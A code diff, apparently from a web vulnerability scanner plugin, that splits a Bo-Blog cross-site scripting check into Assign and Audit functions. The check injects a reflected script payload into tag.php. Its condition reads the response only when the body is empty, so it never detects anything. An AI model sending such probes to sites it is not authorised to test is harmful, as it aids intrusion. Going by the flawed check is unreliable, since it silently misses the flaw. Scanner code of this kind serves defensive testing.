@@ -16,33 +16,31 @@ opts = [
 	['url','http://testasp.vulnweb.com','target url'],
 ]
 
-def Audit(services):
-	retinfo = None
-	output = ''
+def Assign(services):
 	if services.has_key('url') and services.has_key('cms'):
 		if services['cms'] == 'Bo-Blog':
-			output += 'plugin run' + os.linesep
-			url = services['url'] + "/tag.php"
-			try:
-				rqu = requests.get(url)
-				if rqu.text:
-					res = rqu.text
-					m = re.search('title="[^"]+"><span style="font[^"]+">([^<]+)</span></a>', res, re.I)
-					if m:
-						tag = m.group(1)
-						# fuzz xss
-						fuzz_url = services['url'] + 'tag.php?tag=' + tag + '&mode=1>%22><ScRiPt>alert(/xss%20test/)</ScRiPt>'
-						fuzz_rqu = requests.get(fuzz_url)
-						if not fuzz_rqu.text:
-							res = fuzz_rqu.text
-							if res and res.find('\\"><ScRiPt>alert(/xss test/)</ScRiPt>') != -1:
-								retinfo = {'level':'medium','content':url}
-								output += 'Vula:\t' + url
-								security_warning(url)
+			return True
+	return False
 
-			except:
-				pass
-	return (retinfo,output)
+def Audit(services):
+	url = services['url'] + "/tag.php"
+	try:
+		rqu = requests.get(url)
+		if rqu.text:
+			res = rqu.text
+			m = re.search('title="[^"]+"><span style="font[^"]+">([^<]+)</span></a>', res, re.I)
+			if m:
+				tag = m.group(1)
+				# fuzz xss
+				fuzz_url = services['url'] + 'tag.php?tag=' + tag + '&mode=1>%22><ScRiPt>alert(/xss%20test/)</ScRiPt>'
+				fuzz_rqu = requests.get(fuzz_url)
+				if not fuzz_rqu.text:
+					res = fuzz_rqu.text
+					if res and res.find('\\"><ScRiPt>alert(/xss test/)</ScRiPt>') != -1:
+						security_warning(url)
+
+	except:
+		pass
 # ----------------------------------------------------------------------------------------------------
 #	untest yet
 # ----------------------------------------------------------------------------------------------------
